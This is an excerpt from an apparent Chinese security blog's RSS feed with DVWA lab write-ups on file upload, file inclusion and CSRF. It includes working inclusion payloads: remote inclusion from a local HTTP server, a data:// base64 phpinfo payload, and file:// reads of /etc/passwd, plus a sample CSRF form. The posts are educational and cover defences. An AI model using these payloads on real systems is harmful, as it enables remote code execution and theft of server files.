srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220427113343344_hu98b222d9b96c591e0c6a2e4501db9786_200593_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220427113343344_hu98b222d9b96c591e0c6a2e4501db9786_200593_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427113343344"
class="gallery-image"
data-flex-grow="211"
data-flex-basis="507px"
>&lt;/p>
&lt;p>完成。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>阻止上传的文件没有夹带私货基本不太可能，毕竟可以用各种乱七八糟的办法把代码隐藏起来，比如编码成像素。但阻止利用还是可以的，把文件包含的洞和文件名解析的洞堵上，传个图片马之类的就没什么用了。图片马应该也能通过搜索文件内容是否包含特定字节序列（比如&lt;code>&amp;lt;?php&lt;/code>）来堵一部分利用方式吧，虽然说有误杀的可能。&lt;/p>
&lt;p>还有种做法是考虑不要把上传文件存到可能被当代码解析的地方，比如和代码一起放在 &lt;code>/var/www/html&lt;/code>。可以考虑下部署个 Ceph 之类的对象存储服务或者买大厂的对象存储。这样的话解析漏洞大概率是用不了了，包含漏洞也只要堵上远程包含就行。相应的对象存储服务本身有没有洞，有没有按最佳实践做好保护都会变成新问题=。=这属于是扩大攻击面了。&lt;/p>
&lt;p>不过编程习惯好的码农再加上一门合适的语言和技术选型，相对安全还是能有个大概的保障的吧，咱也不敢说死，毕竟菜，啥也不懂。但烂项目是真的可以很烂，之前玩弄过的一个 Android App 就非常山寨，居然秘钥都敢放客户端=。=这帮人到底怎么做的技术决策我是真的无法理解了。&lt;/p>
&lt;p>好了，哔哔完了。&lt;/p></description></item><item><title>DVWA上手记录-文件包含</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-04/</link><pubDate>Tue, 26 Apr 2022 15:07:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-04/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>这次玩一下 DVWA 的文件包含。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;h3 id="php和include">PHP和include&lt;/h3>
&lt;p>在 php 语言中 &lt;code>include&lt;/code> 表达式用于包含指定的文件，写过 C/C++ 应该对 &lt;code>#include&lt;/code> 预处理指令比较熟，php 的 &lt;code>include&lt;/code> 表达式和 &lt;code>#include&lt;/code> 在某种程度上很相似，都是从指定的搜索路径里找到文件并“包含”进来。被包含的文件可以是 php 文件也可以是别的文件，这点和 &lt;code>#include&lt;/code> 预处理器比较像。&lt;/p>
&lt;p>然后，因为 &lt;code>include&lt;/code> 可以写做表达式的缘故，在 php 里可以 &lt;code>include $file&lt;/code>，如果把用户传入的数据未经过检查就交给 &lt;code>include&lt;/code> 的话就可能产生一个文件包含漏洞。&lt;/p>
&lt;blockquote>
&lt;p>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在&lt;a class="link" href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener"
>有效的 PHP 起始和结束标记&lt;/a>之中。&lt;/p>
&lt;/blockquote>
&lt;p>解释器的这个行为进一步拓宽了可利用的范围。&lt;/p>
&lt;blockquote>
&lt;p>如果“&lt;a class="link" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener"
>URL include wrappers&lt;/a>”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见&lt;a class="link" href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener"
>支持的协议和封装协议&lt;/a>）而不是本地文件来指定要被包含的文件。&lt;/p>
&lt;/blockquote>
&lt;p>对 &lt;code>include&lt;/code> 参数有足够控制的情况下，可以利用远程包含来执行任意代码。挑选合适的 url 协议可以 bypass 不够严谨的参数检查。&lt;/p>
&lt;h3 id="本地文件包含">本地文件包含&lt;/h3>
&lt;p>本地文件包含一般可以是 &lt;code>include &amp;quot;some/folder/&amp;quot; . $_GET[&amp;quot;file&amp;quot;] . &amp;quot;.php&amp;quot;&lt;/code> 或类似的形式，此时可以通过 &lt;code>file=../../malicious&lt;/code> 这样的 payload 来包含任意代码。&lt;/p>
&lt;h3 id="远程文件包含">远程文件包含&lt;/h3>
&lt;p>此时对 &lt;code>include&lt;/code> 参数有更强的控制，也可以通过 url 协议来远程包含 php 代码执行。或者 &lt;code>zlib://&lt;/code> 之类的协议直接把要执行的代码放在 payload 里。&lt;/p>
&lt;h2 id="文件包含">文件包含&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609.png"
width="694"
height="206"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140326609"
class="gallery-image"
data-flex-grow="336"
data-flex-basis="808px"
>&lt;/p>
&lt;p>页面没有什么特别的，点击上面的 &lt;code>file1.php&lt;/code>、&lt;code>file2.php&lt;/code>、&lt;code>file3.php&lt;/code> 能分别看到三个不同的子页面：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312.png"
width="681"
height="289"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140433312"
class="gallery-image"
data-flex-grow="235"
data-flex-basis="565px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863.png"
width="686"
height="294"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140441863"
class="gallery-image"
data-flex-grow="233"
data-flex-basis="560px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138.png"
width="692"
height="345"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140450138"
class="gallery-image"
data-flex-grow="200"
data-flex-basis="481px"
>&lt;/p>
&lt;p>注意地址栏会发现有意思的地方：&lt;/p>
&lt;ul>
&lt;li>首页：http://localhost:8080/vulnerabilities/fi/?page=index.php&lt;/li>
&lt;li>file1：http://localhost:8080/vulnerabilities/fi/?page=file1.php&lt;/li>
&lt;li>file2：http://localhost:8080/vulnerabilities/fi/?page=file2.php&lt;/li>
&lt;li>file3：http://localhost:8080/vulnerabilities/fi/?page=file3.php&lt;/li>
&lt;/ul>
&lt;p>很直接地想到 &lt;code>index.php&lt;/code>、&lt;code>file1.php&lt;/code>、&lt;code>file2.php&lt;/code>、&lt;code>file3.php&lt;/code>就是被包含的文件了。尝试提交一个 &lt;code>page=file4.php&lt;/code>，发现彩蛋。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383.png"
width="675"
height="158"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140828383"
class="gallery-image"
data-flex-grow="427"
data-flex-basis="1025px"
>&lt;/p>
&lt;p>直接观察 dvwa 源码，可以发现 &lt;code>include&lt;/code> 出现的位置是 &lt;code>dvwa/vulnerabilities/fi/index.php&lt;/code> 里，&lt;code>php.ini&lt;/code> 配置的 &lt;code>include_path&lt;/code> 应该是包含当前目录 &lt;code>.&lt;/code> 的，所以可以直接取相对路径包含任意文件。&lt;/p>
&lt;p>差不多就是这样了。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>因为已经有一个 phpinfo 页面，我们先尝试包含一下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540.png"
width="1266"
height="325"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426141056540"
class="gallery-image"
data-flex-grow="389"
data-flex-basis="934px"
>&lt;/p>
&lt;p>好的，直接成功。下一个问题是怎么 get shell。考虑服务在 docker 内，apache 的日志都链接到了 &lt;code>/dev/stdout&lt;/code> 和 &lt;code>/dev/stderr&lt;/code>，通过包含日志来执行代码是不行了。上传文件暂不考虑（因为还没开始做任意文件上传），故考虑下远程文件包含和利用url协议。&lt;/p>
&lt;p>先试一下远程文件包含。&lt;code>python3 -m http.server&lt;/code>开个 http 服务器，下面放个 &lt;code>2.php&lt;/code>，然后构造 url：&lt;code>http://localhost:8080/vulnerabilities/fi/?page=http://172.17.0.1:8000/2.php&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274.png"
width="1323"
height="287"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426142642274"
class="gallery-image"
data-flex-grow="460"
data-flex-basis="1106px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="提高难度medium">提高难度：Medium&lt;/h3>
&lt;p>看看 Medium 难度下的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Input validation
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;http://&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;https://&amp;#34;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;../&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;..&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用 &lt;code>str_replace&lt;/code> 替换掉了 &lt;code>../&lt;/code> 和 &lt;code>http://&lt;/code> 来解决目录穿越和 http 文件包含。但 php 支持的 url 协议显然不止这俩&amp;hellip;&lt;/p>
&lt;p>改成&lt;code>data://&lt;/code>协议，重写一个 payload：&lt;code>http://localhost:8080/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=&lt;/code>。这段 base64 是 &lt;code> echo '&amp;lt;?php phpinfo(); ?&amp;gt;' | base64&lt;/code> 产生的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441.png"
width="1271"
height="330"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426143248441"
class="gallery-image"
data-flex-grow="385"
data-flex-basis="924px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="提高难度high">提高难度：High&lt;/h3>
&lt;p>High 难度下使用了 &lt;code>fnmatch&lt;/code> 匹配文件名，但模式是 &lt;code>file*&lt;/code>，所以还是有完蛋的可能。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Input validation
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">fnmatch&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;file*&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;include.php&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// This isn&amp;#39;t the page we want!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR: File not found!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先试一下能不能用&lt;code>file://&lt;/code>来 bypass 掉这个模式匹配。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394.png"
width="1044"
height="320"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426143800394"
class="gallery-image"
data-flex-grow="326"
data-flex-basis="783px"
>&lt;/p>
&lt;p>好的，成功 bypass 掉了这个模式，并且包含 &lt;code>/etc/passwd&lt;/code> 成功了。不过&lt;code>/etc/shadow&lt;/code>就没权限了。&lt;/p>
&lt;p>后续利用需要一个值得被包含的文件，如果服务器上有 mysql 配置之类的文件而且能读的话包含也不错。如果有上传点的话可以尝试传个马再包含。&lt;/p>
&lt;p>我太菜，虽然本地文件包含找出来了，想不到怎么用服务器上已有的文件去 get shell，日志包含又不可用。&lt;/p>
&lt;h3 id="帮助文档">帮助文档&lt;/h3>
&lt;p>差不多三个难度都解好了，接着看下帮助文档拓宽下思路。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Objective&lt;/strong>&lt;/p>
&lt;p>Read all five famous quotes from &amp;lsquo;&lt;a class="link" href="http://localhost:8080/hackable/flags/fi.php" target="_blank" rel="noopener"
>../hackable/flags/fi.php&lt;/a>&amp;rsquo; using only the file inclusion.&lt;/p>
&lt;/blockquote>
&lt;p>哦？目标是获取 &lt;code>hackable&lt;/code>下的 flag。稍改下 payload 很快就拿到了&lt;code>fi.php&lt;/code>的内容。&lt;/p>
&lt;blockquote>
&lt;p>1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don&amp;rsquo;t know.&lt;/p>
&lt;p>&amp;ndash;LINE HIDDEN ;)&amp;ndash;&lt;/p>
&lt;p>4.) The pool on the roof must have a leak.&lt;/p>
&lt;/blockquote>
&lt;p>这个 &lt;code>LINE HIDDEN&lt;/code> 有点怪，不是说 &lt;code>five famous quotes&lt;/code> 吗，这只有4条。于是看了眼 &lt;code>fi.php&lt;/code>，发现是这样的=。=并不是没完全拿到flag。我寻思要完全拿到的话可以在 get shell 之后把 &lt;code>fi.php&lt;/code> 下载下来，不然单纯包含这个文件肯定是不行的。&lt;/p>
&lt;p>impossible 难度代码长这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Only allow include.php or file{1..3}.php
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;include.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file1.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file2.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file3.php&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// This isn&amp;#39;t the page we want!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR: File not found!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>硬编码了所有可能的文件，如此一来就没有利用空间了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>文件包含这题感觉有点emmm&lt;/p>
&lt;p>怎么说呢，DVWA的题好像都有点简单过头的样子=。=虽然我是这么想但感觉作为一个才开始接触安全方面，学习时间一星期不到的人来说说出这话有点不应该，膨胀了。&lt;/p>
&lt;p>因为种种原因吧，感觉今年的自己特别焦躁。工资还只有这么点，事事不顺。一边劝自己知足，换工作不会改善现状，一边又焦虑自己一无所成。&lt;/p>
&lt;p>烦心。&lt;/p></description></item><item><title>DVWA上手记录-CSRF</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</link><pubDate>Mon, 25 Apr 2022 16:33:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>这次看下 DVWA 的 CSRF 题。&lt;/p>
&lt;p>昨天忙完了工作，闲下来的时间顺便看了下 DVWA 的部署。在我的 fork 分支里添加了 docker 支持。因为是纯新增，不太可能有 breaking change，直接在 GitHub 网页点点鼠标就能同步上游代码。这样就能用上最新的 DVWA 同时享受 docker 一键启动 DVWA 环境的快乐了。&lt;/p>
&lt;p>用法很简单：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git clone https://github.com/nnnewb/dvwa
&lt;span class="nb">cd&lt;/span> dvwa
docker-compose up -d --build
&lt;/code>&lt;/pre>&lt;/div>&lt;p>就这样！&lt;/p>
&lt;p>当然还有可能遇到一些网络问题，什么&lt;code>deb.debian.org&lt;/code>访问慢或者&lt;code>timeout&lt;/code>、&lt;code>connection reset&lt;/code>之类的，但我觉得想玩这个的多少得有点自己动手解决问题的能力吧，不能跟三岁小孩一样等别人喂嘴里。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;h3 id="利用方式">利用方式&lt;/h3>
&lt;p>CSRF 全名是跨站请求伪造 &lt;em>Cross Site Request Forgery&lt;/em> 。&lt;/p>
&lt;p>简单地说，服务器相信收到的请求是用户控制浏览器发起的，是出于用户自身的意图做某些操作。但实际上，是另一个恶意网站的 js 脚本控制了用户的浏览器，在用户不知情的情况下，冒充用户的身份请求服务器做一些并非出自用户本意的操作。&lt;/p>
&lt;p>CSRF 利用中有三个组成部分：&lt;/p>
&lt;ul>
&lt;li>用户浏览器&lt;/li>
&lt;li>目标服务器&lt;/li>
&lt;li>恶意网站&lt;/li>
&lt;/ul>
&lt;p>用户不访问恶意网站，CSRF 攻击就无从谈起。&lt;/p>
&lt;h3 id="和cors的关系">和CORS的关系&lt;/h3>
&lt;p>说没关系其实也有。CORS全称是 &lt;em>Cross Origin Resource Sharing&lt;/em>，跨域资源共享，也是防浏览器被恶意网站控制着，背着用户拿自己的数据。但有所不同的是，CORS 其实是相当宽松的，因为 CORS 只要求浏览器对 “复杂请求” 发送预检，但简单请求（注意哦，包括 POST 请求，但只能包含指定的 Header 和限定的 &lt;code>Content-Type&lt;/code>）会直接呈交给服务器。&lt;/p>
&lt;p>而且这个请求是可以带 Cookies 的，也就是说只要接口满足条件（接受限定的 &lt;code>Content-Type&lt;/code>，对 Header 没有要求），CORS 策略就没法阻止 CSRF 攻击。&lt;/p>
&lt;p>举一个更实际的例子，哪怕恶意网站只是写了一个简单的表单：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">form&lt;/span> &lt;span class="na">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;POST&amp;#34;&lt;/span> &lt;span class="na">action&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://good.com/some/action&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;text&amp;#34;&lt;/span> &lt;span class="na">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;hello&amp;#34;&lt;/span>&lt;span class="p">/&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">button&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;submit&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>submit&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>也满足 CORS 对于 &lt;em>简单请求&lt;/em> 的定义，浏览器不会阻止或预检。&lt;/p>
&lt;p>因此，即使配置良好的 CORS，也无法杜绝 CSRF 攻击。但 CORS 确实是防御 CSRF 攻击的重要环节。&lt;/p>
&lt;h3 id="防御">防御&lt;/h3>
&lt;p>防御CSRF攻击说难不难，因为&lt;a class="link" href="https://portswigger.net/web-security/CSRF" target="_blank" rel="noopener"
>发起 CSRF 攻击有几个重要前提&lt;/a>：&lt;/p>
&lt;ul>
&lt;li>基于 Cookies 的会话控制&lt;/li>
&lt;li>没有不可预测的请求参数&lt;/li>
&lt;/ul>
&lt;p>基于上面两点：&lt;/p>
&lt;p>如果会话控制存在于自定义的 HTTP 头或 Cookies 之外的 HTTP 头（比如&lt;code>Authorization&lt;/code>），那么 CORS 就会要求先发出一个预检请求，只有在服务器返回 &lt;code>Access-Control-Allow-Origin&lt;/code> 包含当前域名的时候才会正式发出请求。这样一来除非先 bypass CORS ，不然就无法发起 CSRF 攻击。&lt;/p>
&lt;p>另一种就是增加一个攻击者不可预测的参数，也就是常说的 CSRF Token。&lt;/p>
&lt;p>CSRF Token 是一个和会话绑定的随机（至少对攻击者来说不可预知的）字符串（或别的数据类型）。CSRF 的作用原理依然是要依靠 CORS，恶意网站如果要伪造请求提交一个表单，那就必须拿到 CSRF Token，想获取 CSRF Token 就必须拿到表单所在的页面，而请求表单页面就必须满足 CORS 策略——即使是简单请求，没有预检，浏览器在收到响应后也会根据 &lt;code>Access-Control-Allow-Origin&lt;/code> 的设定拒绝给 XHR 返回数据。网页拿不到 CSRF Token，自然也就没办法伪造出请求。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>好的，就是踩点。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872.png"
width="694"
height="384"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872_hu9f65ffe27ceedc88d5a5d4b939cdbb89_29651_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872_hu9f65ffe27ceedc88d5a5d4b939cdbb89_29651_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113359872"
class="gallery-image"
data-flex-grow="180"
data-flex-basis="433px"
>&lt;/p>
&lt;p>一个修改密码的页面，只有登陆用户能修改自己的密码（因为不登陆根本看不到这个页面）。另外还提供了一个测试登陆的地方，就是那个 &lt;em>Test Credentials&lt;/em> 按钮。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432.png"
width="602"
height="462"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432_hu6562a17a4cfa6d40103e315209b7dae1_19442_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432_hu6562a17a4cfa6d40103e315209b7dae1_19442_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113529432"
class="gallery-image"
data-flex-grow="130"
data-flex-basis="312px"
>&lt;/p>
&lt;p>在测试登陆这里输入自己的用户名密码（默认是 &lt;code>admin&lt;/code>,&lt;code>password&lt;/code>）会提示&lt;code>valid password for 'admin'&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471.png"
width="602"
height="462"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471_hu7a377251ca067ccef2deefe4b718b765_20140_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471_hu7a377251ca067ccef2deefe4b718b765_20140_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113619471"
class="gallery-image"
data-flex-grow="130"
data-flex-basis="312px"
>&lt;/p>
&lt;p>修改密码的地方我们也试一试。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665.png"
width="681"
height="359"
